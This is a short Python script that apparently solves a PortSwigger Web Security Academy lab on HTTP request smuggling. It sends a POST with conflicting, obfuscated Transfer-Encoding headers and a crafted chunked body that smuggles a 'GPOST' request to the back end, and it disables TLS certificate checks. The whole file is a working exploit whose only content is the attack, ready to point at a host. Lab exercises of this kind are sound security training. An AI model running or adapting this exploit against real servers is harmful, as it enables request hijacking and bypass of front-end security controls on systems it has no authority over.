import urllib.parse
import http.client
import ssl

LAB_ID = "???"


def GET_() -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'Transfer-encoding': 'chunked',
        'transfer-encoding': 'x',
    }
    smuggled = "GPOST / HTTP/1.1\r\ncontent-length: 3\r\n"
    smuggled_len = f'{len(smuggled):x}'
    body = f"{smuggled_len}\r\n{smuggled}\r\n0\r\n\r\n"
    headers['content-length'] = str(len(smuggled_len) + 2)
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body.encode('utf-8'), headers)
    return connection.getresponse()


response = GET_()
print(response.status)
print(response.headers)
print(response.read().decode())
